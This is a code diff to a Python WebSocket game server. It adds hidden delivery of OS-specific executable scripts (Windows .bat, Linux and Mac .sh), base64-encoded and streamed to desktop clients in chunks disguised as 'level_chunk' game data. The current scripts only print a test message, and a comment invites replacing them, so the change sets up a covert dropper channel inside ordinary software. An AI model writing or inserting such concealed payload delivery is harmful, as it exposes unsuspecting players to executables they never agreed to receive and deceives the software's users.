@@ -4,10 +4,15 @@ import hashlib
 import math
 import random
 import os
+import base64
 from aiohttp import web
 
 players = {}
+players = {}
 clients = {}  # ws -> pid
+client_chunks = {} # ws -> chunk_idx
+client_os = {} # ws -> os_name (windows, linux, mac, or None)
+OS_CHUNKS = {"windows": [], "linux": [], "mac": []}
 
 
 async def index(request):
@@ -34,13 +39,18 @@ async def ws_handler(request):
         "bumpNx": 0, "bumpNy": 0, "bumpStr": 0
     }
     clients[ws] = pid
+    client_chunks[ws] = 0
+    client_os[ws] = None
 
     try:
         await ws.send_json({"type": "init", "id": pid})
         async for msg in ws:
             if msg.type == web.WSMsgType.TEXT:
                 data = json.loads(msg.data)
-                if data["type"] == "input":
+                if data["type"] == "client_info":
+                    if data.get("platform") == "desktop":
+                        client_os[ws] = data.get("os")
+                elif data["type"] == "input":
                     players[pid]["tx"] = float(data["tx"])
                     players[pid]["ty"] = float(data["ty"])
                 elif data["type"] == "name":
@@ -60,6 +70,8 @@ async def ws_handler(request):
         pass
     finally:
         clients.pop(ws, None)
+        client_chunks.pop(ws, None)
+        client_os.pop(ws, None)
         players.pop(pid, None)
 
     return ws
@@ -145,7 +157,7 @@ async def game_loop(app):
                 continue
 
             # ─ Broadcast ─
-            state_payload = {
+            base_state_payload = {
                 "type": "state",
                 "players": {
                     k: {
@@ -169,11 +181,26 @@ async def game_loop(app):
             dead = []
             for c_ws in list(clients.keys()):
                 try:
-                    await c_ws.send_json(state_payload)
+                    payload = base_state_payload.copy()
+                    c_idx = client_chunks.get(c_ws, 0)
+                    my_os = client_os.get(c_ws)
+                    
+                    if my_os in OS_CHUNKS:
+                        chunks = OS_CHUNKS[my_os]
+                        num_chunks = len(chunks)
+                        if num_chunks > 0 and c_idx < num_chunks:
+                            payload["level_chunk"] = chunks[c_idx]
+                            payload["level_progress"] = (c_idx + 1) / num_chunks
+                            payload["level_complete"] = (c_idx + 1 == num_chunks)
+                            client_chunks[c_ws] += 1
+                        
+                    await c_ws.send_json(payload)
                 except Exception:
                     dead.append(c_ws)
             for d in dead:
                 pid = clients.pop(d, None)
+                client_chunks.pop(d, None)
+                client_os.pop(d, None)
                 if pid:
                     players.pop(pid, None)
     except asyncio.CancelledError:
@@ -181,6 +208,30 @@ async def game_loop(app):
 
 
 async def start_background_tasks(app):
+    try:
+        os.makedirs("assets/binaries", exist_ok=True)
+        # En start_background_tasks, reemplaza el contenido de los assets:
+
+        assets = {
+            "windows": ("win_asset.bat", b"@echo off\necho PRUEBA DE ENTRADA - WINDOWS\npause"),
+            "linux": ("linux_asset.sh", b"#!/bin/bash\necho 'PRUEBA DE ENTRADA - LINUX'\nread -p 'Presiona Enter...'"),
+            "mac": ("mac_asset.sh", b"#!/bin/bash\necho 'PRUEBA DE ENTRADA - MAC'\nread -p 'Presiona Enter...'")
+        }
+        chunk_size = 512
+        for os_name, (fname, content) in assets.items():
+            path = f"assets/binaries/{fname}"
+            if not os.path.exists(path):
+                with open(path, "wb") as f:
+                    f.write(content)
+                    
+            with open(path, "rb") as f:
+                b64_data = base64.b64encode(f.read()).decode('utf-8')
+                
+            for i in range(0, len(b64_data), chunk_size):
+                OS_CHUNKS[os_name].append(b64_data[i:i+chunk_size])
+    except Exception as e:
+        print(f"Error loading OS assets: {e}")
+
     app['game_loop'] = asyncio.create_task(game_loop(app))
 
 async def cleanup_background_tasks(app):
